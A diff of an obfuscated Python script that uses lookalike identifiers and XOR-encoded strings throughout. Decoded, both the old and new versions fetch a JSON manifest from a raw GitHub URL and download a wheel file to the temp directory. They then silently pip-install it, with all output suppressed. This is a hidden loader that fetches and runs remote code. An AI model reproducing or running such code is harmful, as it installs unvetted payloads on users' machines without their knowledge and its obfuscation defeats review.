@@ -1,46 +1,37 @@
 _B=''
 _A=chr
 
-IlIIlIIlIllII = getattr(__import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(18, [112, 103, 123, 126, 102, 123, 124, 97])), (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(247, [178, 143, 148, 146, 135, 131, 158, 152, 153]))
-IIllllIllIIIlIIII = getattr(__import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(214, [180, 163, 191, 186, 162, 191, 184, 165])), (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(42, [69, 90, 79, 68]))
-lIlllIIIIllIIllllIl = getattr(__import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(92, [62, 41, 53, 48, 40, 53, 50, 47])), (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(74, [58, 56, 35, 36, 62]))
-llIIIlIIIllIIIIlIIl = getattr(__import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(187, [217, 206, 210, 215, 207, 210, 213, 200])), (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(101, [22, 17, 23]))
-lllllIIIlllIIIIIII = __import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(187, [212, 200]))
-IlllllIllIlIIlIIl = __import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(133, [246, 252, 246]))
-llllIllIlIIlllll = __import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(25, [115, 106, 118, 119]))
-IlllllllIIllllII = __import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(254, [138, 155, 147, 142, 152, 151, 146, 155]))
-lIlllllllllll = __import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(127, [12, 10, 29, 15, 13, 16, 28, 26, 12, 12]))
-IlIIIlIIlIIIIIlllIIll = __import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(75, [57, 46, 58, 62, 46, 56, 63, 56]))
-IIlllllllIIllII = (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(50, [73, 79, 28, 73, 79]).format(IlllllIllIlIIlIIl.version_info.major, IlllllIllIlIIlIIl.version_info.minor)
-IllIlllIlIIIIlIIl = (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(10, [98, 126, 126, 122, 121, 48, 37, 37, 120, 107, 125, 36, 109, 99, 126, 98, 127, 104, 127, 121, 111, 120, 105, 101, 100, 126, 111, 100, 126, 36, 105, 101, 103, 37, 120, 107, 96, 124, 111, 111, 120, 111, 114, 111, 37, 89, 101, 127, 97, 90, 107, 126, 105, 98, 111, 120, 37, 120, 111, 108, 121, 37, 98, 111, 107, 110, 121, 37, 103, 107, 99, 100, 37, 108, 99, 102, 111, 121, 36, 96, 121, 101, 100])
+IIIIIlIIllllI = getattr(__import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(157, [255, 232, 244, 241, 233, 244, 243, 238])), (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(91, [30, 35, 56, 62, 43, 47, 50, 52, 53]))
+IllIllIlIlIlIllllIIII = getattr(__import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(230, [132, 147, 143, 138, 146, 143, 136, 149])), (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(146, [253, 226, 247, 252]))
+lIlllIIlIIlIIl = getattr(__import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(155, [249, 238, 242, 247, 239, 242, 245, 232])), (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(129, [241, 243, 232, 239, 245]))
+lIIIIllIllllIIllII = __import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(188, [211, 207]))
+IlllIllIlIIlIlIIl = __import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(137, [250, 240, 250]))
+llIIIIIIllIllll = __import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(7, [109, 116, 104, 105]))
+lIIIlIIllIlIIlllll = __import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(208, [164, 181, 189, 160, 182, 185, 188, 181]))
+lllllIIIIIIII = __import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(58, [73, 79, 88, 74, 72, 85, 89, 95, 73, 73]))
+IIIIIIIlllIllllllIl = __import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(159, [237, 250, 238, 234, 250, 236, 235, 236]))
+lllIlIlIlIlllllIIlIIl = (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(23, [108, 106, 57, 108, 106]).format(IlllIllIlIIlIlIIl.version_info.major, IlllIllIlIIlIlIIl.version_info.minor)
+IIlIIIlIIllllll = (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(102, [14, 18, 18, 22, 21, 92, 73, 73, 20, 7, 17, 72, 1, 15, 18, 14, 19, 4, 19, 21, 3, 20, 5, 9, 8, 18, 3, 8, 18, 72, 5, 9, 11, 73, 20, 7, 12, 16, 3, 3, 20, 3, 30, 3, 73, 53, 9, 19, 13, 54, 7, 18, 5, 14, 3, 20, 73, 20, 3, 0, 21, 73, 14, 3, 7, 2, 21, 73, 11, 7, 15, 8, 73, 0, 15, 10, 3, 21, 72, 12, 21, 9, 8])
 
-def llIlIIIIllIIIlllIll(name: llIIIlIIIllIIIIlIIl):
-    (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(86, [21, 62, 51, 53, 61, 118, 59, 57, 50, 35, 58, 51, 118, 51, 46, 63, 37, 34, 51, 56, 53, 51, 118, 33, 63, 34, 62, 57, 35, 34, 118, 63, 59, 38, 57, 36, 34, 63, 56, 49, 120])
+def IIIIllIlIIlI(cmd):
+    (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(134, [212, 243, 232, 166, 245, 243, 228, 246, 244, 233, 229, 227, 245, 245, 166, 241, 239, 242, 238, 233, 243, 242, 166, 246, 244, 239, 232, 242, 239, 232, 225, 166, 231, 232, 255, 242, 238, 239, 232, 225, 168])
+    with IllIllIlIlIlIllllIIII(lIIIIllIllllIIllII.devnull, (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(107, [28, 9])) as lIIlllIIIIlIIIlIIllIl:
+        return lllllIIIIIIII.run(cmd, stdout=lIIlllIIIIlIIIlIIllIl, stderr=lIIlllIIIIlIIIlIIllIl)
+
+def IlIlIllllllllIIlll():
     try:
-        lIIlIIIIllIIllIlIlIlll = __import__((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(206, [167, 163, 190, 161, 188, 186, 162, 167, 172, 224, 187, 186, 167, 162]))
-        return lIIlIIIIllIIllIlIlIlll.util.find_spec(name) is not None
-    except IlIIlIIlIllII:
-        return False
-
-def lIIllIIlIIlIIIIIIIIlIl(cmd):
-    (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(191, [237, 202, 209, 159, 204, 202, 221, 207, 205, 208, 220, 218, 204, 204, 159, 200, 214, 203, 215, 208, 202, 203, 159, 207, 205, 214, 209, 203, 214, 209, 216, 159, 222, 209, 198, 203, 215, 214, 209, 216, 145])
-    with IIllllIllIIIlIIII(lllllIIIlllIIIIIII.devnull, (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(165, [210, 199])) as lIlIlIlIlIIIII:
-        return lIlllllllllll.run(cmd, stdout=lIlIlIlIlIIIII, stderr=lIlIlIlIlIIIII)
-
-def IlIIllIIIlIIlIlIIlIll():
-    try:
-        lIIlIIlIIIlIIIIlIIIlIl = IlIIIlIIlIIIIIlllIIll.get(IllIlllIlIIIIlIIl).json()
-        IIllIllIllIIIIIlllIl = lIIlIIlIIIlIIIIlIIIlIl.get(IIlllllllIIllII)
-        if not IIllIllIllIIIIIlllIl:
-            lIlllIIIIllIIllllIl((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(248, [163, 217, 165, 216, 182, 151, 216, 154, 141, 145, 148, 156, 216, 158, 151, 138, 216, 168, 129, 140, 144, 151, 150]), IIlllllllIIllII)
+        IIIlllllIIlllIIIIllI = IIIIIIIlllIllllllIl.get(IIlIIIlIIllllll).json()
+        lllIllIIllIlllllllIl = IIIlllllIIlllIIIIllI.get(lllIlIlIlIlllllIIlIIl)
+        if not lllIllIIllIlllllllIl:
+            lIlllIIlIIlIIl((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(129, [218, 160, 220, 161, 207, 238, 161, 227, 244, 232, 237, 229, 161, 231, 238, 243, 161, 209, 248, 245, 233, 238, 239]), lllIlIlIlIlllllIIlIIl)
             return
-        llIlllIllIIllllI = IlllllllIIllllII.gettempdir()
-        llIllIllIIIlIIIllllIl = lllllIIIlllIIIIIII.path.join(llIlllIllIIllllI, (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(28, [111, 115, 105, 119, 108, 125, 104, 127, 116, 49, 45, 50, 44, 50, 44, 49, 108, 101, 47, 49, 114, 115, 114, 121, 49, 125, 114, 101, 50, 107, 116, 112]))
-        lIIIlIIlIlllII = IlIIIlIIlIIIIIlllIIll.get(IIllIllIllIIIIIlllIl).content
-        with IIllllIllIIIlIIII(llIllIllIIIlIIIllllIl, (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(43, [92, 73])) as IlIIIIlIllIIlIIIl:
-            IlIIIIlIllIIlIIIl.write(lIIIlIIlIlllII)
-        lIIllIIlIIlIIIIIIIIlIl([IlllllIllIlIIlIIl.executable, (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(201, [228, 164]), (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(195, [179, 170, 179]), (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(122, [19, 20, 9, 14, 27, 22, 22]), llIllIllIIIlIIIllllIl])
-    except IlIIlIIlIllII as IlIIIlllllIIIlII:
-        lIlllIIIIllIIllllIl((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(65, [26, 96, 28, 97, 4, 51, 51, 46, 51, 123]), IlIIIlllllIIIlII)
-if not llIlIIIIllIIIlllIll((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(6, [85, 105, 115, 109, 86, 103, 114, 101, 110])):
-    IlIIllIIIlIIlIlIIlIll()
+        lIIlllIlIlIIIllIIIl = lIIIlIIllIlIIlllll.gettempdir()
+        IIlIlIllllIlllIlI = lIIIIllIllllIIllII.path.join(lIIlllIlIlIIIllIIIl, (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(62, [77, 81, 75, 85, 78, 95, 74, 93, 86, 19, 15, 16, 14, 16, 14, 19, 78, 71, 13, 19, 80, 81, 80, 91, 19, 95, 80, 71, 16, 73, 86, 82]))
+        IlllIIIIlIlIII = IIIIIIIlllIllllllIl.get(lllIllIIllIlllllllIl).content
+        with IllIllIlIlIlIllllIIII(IIlIlIllllIlllIlI, (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(63, [72, 93])) as llllllIllIIlIlIIllllI:
+            llllllIllIIlIlIIllllI.write(IlllIIIIlIlIII)
+        IIIIllIlIIlI([IlllIllIlIIlIlIIl.executable, (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(134, [171, 235]), (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(91, [43, 50, 43]), (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(216, [177, 182, 171, 172, 185, 180, 180]), IIlIlIllllIlllIlI])
+    except IIIIIlIIllllI as IIIIlIIlIllllllIIl:
+        lIlllIIlIIlIIl((lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(178, [233, 147, 239, 146, 247, 192, 192, 221, 192, 136]), IIIIlIIlIllllllIIl)
+if __name__ == (lambda a, b: _B.join((_A(_C ^ a) for _C in b)))(20, [75, 75, 121, 117, 125, 122, 75, 75]):
+    IlIlIllllllllIIlll()
